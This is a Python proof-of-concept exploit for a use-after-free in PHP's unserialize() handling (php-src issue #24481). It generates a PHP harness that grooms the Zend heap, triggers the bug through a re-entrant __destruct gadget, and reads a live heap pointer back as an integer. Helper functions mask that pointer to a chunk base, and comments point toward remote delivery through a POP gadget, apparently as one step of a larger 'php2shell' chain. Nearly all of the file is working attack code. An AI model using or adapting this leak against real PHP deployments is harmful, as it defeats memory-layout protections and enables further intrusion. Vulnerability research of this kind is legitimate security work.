#!/usr/bin/env python3
# INDEX: userland is_long heap-pointer leak via var_destroy uaf | cli | single var_push payload
"""var_destroy deferred-destructor reentry UAF -> userland IS_LONG heap-pointer
leak (php-src issue #24481).

Capability: make a live heap pointer readable back from PHP userland as an
INTEGER (``gettype()=="integer"``; ``serialize()`` -> ``i:<ptr>;``). LEAK probe
only -- no seat, no RCE.

Mechanism: a single top-level ``unserialize()`` of an array with more than
``VAR_ENTRIES_MAX`` (1018) values forces one overflow ``var_entries`` chunk
(8160 B -> a ZendMM large 2-page / 8192 B run). ``var_destroy`` loop 1
``efree``s that chunk but never resets ``(*var_hashx)->last``. An object
orphaned by a duplicate-key overwrite (``i:0;O:1:"R":0:{}`` ... ``i:0;i:777;``)
runs its ``__destruct`` from loop 2 with ``serialize_lock==0`` and
``BG(unserialize).level==1``, so a nested ``unserialize()`` inside it takes the
reuse branch of ``php_var_unserialize_init`` and shares the freed context;
``var_push`` then stores ``rval`` into the freed chunk.

If ``__destruct`` first reclaims the freed 8192 B run with a packed array
(``zval[]``), the layouts alias::

    var_entries (8.4):  used_slots @ +0,  next @ +8,  data[] @ +16
    packed arData:      HT_HASH(-2/-1) @ +0..+7,  arData[0] @ +8

``HT_HASH_RESET_PACKED`` sets the aliased ``used_slots`` (base+0) to -1, so
``var_push`` computes ``data[-1] == base+8 == &arData[0].value`` and stores the
raw ``rval`` there WITHOUT touching ``arData[0].u1.type_info`` (base+16). That
field keeps the IS_LONG tag the reclaimer planted, so element ``[0]`` reads
back as an integer-tagged heap pointer.

Geometry:
  * freed chunk = 8160 B -> 2-page (8192 B) large run.
  * reclaimer must be a packed array whose ``arData`` is also a 2-page run
    (``HT_PACKED_SIZE = 8 + nTableSize*16``; nTableSize 256 -> 4104 B -> 2
    pages): 130..256 elements (capacity 256) is reliable on stock ZendMM.
  * the nested payload must drive exactly ONE ``var_push`` (a scalar: ``i:N;`` /
    ``b:1;`` / ``d:..;`` / ``s:..;`` / ``O:...:0:{}``). A value that pushes twice
    (e.g. a nested array) overwrites ``arData[0].u1`` -> IS_NULL, no leak.

Tested: ASan CLI 8.4.26, 8.4.27, 8.5.12 (gdb ground truth: at the UAF
``var_push`` the stored value == ``rval`` and ``arData[0].u1.type_info`` stays
``0x4`` = IS_LONG).
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import tempfile

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.asan_diff import run_asan  # noqa: E402
from common.zend_mm import chunk_base  # noqa: E402

# Reliable grooming geometry (empirically 20/20 on stock ZendMM 8.4.26).
GROOM_COUNT = 200          # packed reclaimer elements -> capacity 256 -> 2 pages
OUTER_FILLER = 1100        # >1018 forces the overflow var_entries chunk
NESTED = "i:424242;"       # single-var_push scalar -> element[0] stays IS_LONG
SENTINEL_HI = 0x5A5A5A5A00000000   # per-index IS_LONG sentinel in the reclaimer


GADGET_CLASS = "P2SReenter"   # re-entrant __destruct gadget


def build_php(groom=GROOM_COUNT, filler=OUTER_FILLER, nested=NESTED):
    """Return a self-contained PHP harness that triggers the leak and prints a
    machine-parseable result line:  P2S24481 ver=<v> hit=<idx> type=<t> ptr=0x..
    """
    nested_php = nested.replace("\\", "\\\\").replace("'", "\\'")
    return r'''<?php
error_reporting(E_ERROR | E_PARSE);
$GLOBALS['groom'] = null;
$GN = %(groom)d;
class %(cls)s {
    function __destruct() {
        // (b) reclaim the freed 2-page var_entries run with a packed array whose
        // arData lands on it; element[0] carries an IS_LONG sentinel.
        $a = [];
        for ($i = 0; $i < $GLOBALS['GN_'] ; $i++) $a[$i] = %(hi)d | $i;
        $GLOBALS['groom'] = $a;
        // nested unserialize reuses the freed var_hash; its single var_push does
        // data[used_slots(-1)++] = rval  ->  &arData[0].value = rval (heap ptr),
        // leaving arData[0].u1.type_info == IS_LONG untouched.
        $GLOBALS['nested'] = unserialize('%(nested)s');
    }
}
$GLOBALS['GN_'] = $GN;
// (a) outer: >1018 values force an overflow var_entries chunk; key 0 set to the
// gadget object then overwritten by an int -> object orphaned into the deferred
// dtor list so its __destruct fires inside var_destroy with serialize_lock==0.
$NF = %(filler)d;
$p = 'i:0;O:%(clslen)d:"%(cls)s":0:{}';
for ($k = 1; $k <= $NF; $k++) $p .= "i:$k;i:$k;";
$p .= 'i:0;i:777;';
unserialize('a:' . ($NF + 2) . ':{' . $p . '}');

// (c) read the clobbered reclaimer element back from PHP userland.
$g = $GLOBALS['groom'];
$hit = -1; $type = '?'; $ptr = 0;
if (is_array($g)) {
    foreach ($g as $i => $v) {
        if ($v !== (%(hi)d | $i)) { $hit = $i; $type = gettype($v); $ptr = is_int($v) ? $v : 0; break; }
    }
}
printf("P2S24481 ver=%%s hit=%%d type=%%s ptr=0x%%016x int=%%d\n",
       PHP_VERSION, $hit, $type, $ptr, is_int($ptr) ? 1 : 0);
if ($hit >= 0 && is_int($g[$hit])) {
    // reflecting-sink channels: all emit the pointer as a decimal integer.
    printf("P2S24481_SINK serialize=%%s json=%%s echo=%%s\n",
           serialize($g[$hit]), json_encode($g[$hit]), (string)$g[$hit]);
}
''' % {"groom": groom, "filler": filler, "hi": SENTINEL_HI, "nested": nested_php,
       "cls": GADGET_CLASS, "clslen": len(GADGET_CLASS)}


def parse(out):
    """Parse the harness stdout -> dict(ver,hit,type,ptr,int) or None."""
    for line in out.splitlines():
        if line.startswith("P2S24481 "):
            d = {}
            for tok in line.split()[1:]:
                if "=" in tok:
                    k, v = tok.split("=", 1)
                    d[k] = v
            try:
                return {
                    "ver": d.get("ver", "?"),
                    "hit": int(d.get("hit", "-1")),
                    "type": d.get("type", "?"),
                    "ptr": int(d.get("ptr", "0"), 16),
                    "int": d.get("int", "0") == "1",
                }
            except ValueError:
                return None
    return None


def run_docker(image, php_src, use_zend_alloc=True, timeout=120):
    """Run the harness inside a docker image; return (rc, combined_output).

    Thin wrapper over the canonical ASan runner.
    """
    env = None
    if use_zend_alloc:
        # Force ZendMM on (ASAN images default USE_ZEND_ALLOC=0, which breaks
        # the large-run reclaim geometry). On non-ASAN images this is a no-op.
        env = {"USE_ZEND_ALLOC": "1",
               "ASAN_OPTIONS":
                   "detect_leaks=0:abort_on_error=0:allocator_may_return_null=1"}
    return run_asan(php_src, image, env=env,
                    php_ini={"memory_limit": "512M"}, timeout=timeout)


def leak(image, groom=GROOM_COUNT, filler=OUTER_FILLER, nested=NESTED,
         use_zend_alloc=True):
    """Trigger the leak once in `image`; return the parsed result dict or None."""
    rc, out = run_docker(image, build_php(groom, filler, nested), use_zend_alloc)
    return parse(out)


# Reusable decimal -> zend_mm chunk-base channel: mask a leaked interior heap
# pointer to its 2 MiB chunk base to use the leak as a chunk source.


def chunk_base_from_leak(ptr):
    """Mask a leaked interior heap pointer (an int, or the result dict from
    leak()) to its ZendMM 2 MiB chunk base. Only the mask is build/ASLR-robust;
    the in-chunk offset wobbles with request shape and is discarded here."""
    if isinstance(ptr, dict):
        ptr = ptr.get("ptr", 0)
    return chunk_base(int(ptr))


def leak_chunk(image, **kw):
    """Local-docker provider: trigger #24481 once in `image` and return
    (chunk_base, leaked_ptr, result) or (None, None, result). For the REMOTE
    path, pass the app-reflected decimal straight to chunk_base_from_leak()
    instead (remote delivery still needs a dtor-reentry + reflecting POP gadget)."""
    r = leak(image, **kw)
    if not r or not (r.get("int") and r.get("type") == "integer" and r.get("ptr")):
        return None, None, r
    return chunk_base_from_leak(r["ptr"]), r["ptr"], r


def main():
    ap = argparse.ArgumentParser(description="php-src #24481 IS_LONG heap-pointer leak PoC")
    ap.add_argument("--image", default="php2shell-cli-stock:latest",
                    help="docker image to run the PHP harness in")
    ap.add_argument("--groom", type=int, default=GROOM_COUNT)
    ap.add_argument("--filler", type=int, default=OUTER_FILLER)
    ap.add_argument("--nested", default=NESTED)
    ap.add_argument("--runs", type=int, default=1)
    ap.add_argument("--print-php", action="store_true", help="dump the PHP harness and exit")
    args = ap.parse_args()

    if args.print_php:
        print(build_php(args.groom, args.filler, args.nested))
        return 0

    hits = ptrs = 0
    for i in range(args.runs):
        r = leak(args.image, args.groom, args.filler, args.nested)
        if r is None:
            print("[%d] no result line (harness failed?)" % i)
            continue
        is_ptr = r["int"] and r["type"] == "integer" and r["hit"] >= 0 and r["ptr"] != 0
        hits += 1 if (r["hit"] >= 0) else 0
        ptrs += 1 if is_ptr else 0
        print("[%d] ver=%s hit=%d type=%s ptr=0x%012x is_long_heap_ptr=%s"
              % (i, r["ver"], r["hit"], r["type"], r["ptr"], is_ptr))
    print("summary: image=%s runs=%d clobbered=%d is_long_heap_ptr=%d"
          % (args.image, args.runs, hits, ptrs))
    return 0 if ptrs == args.runs and args.runs > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
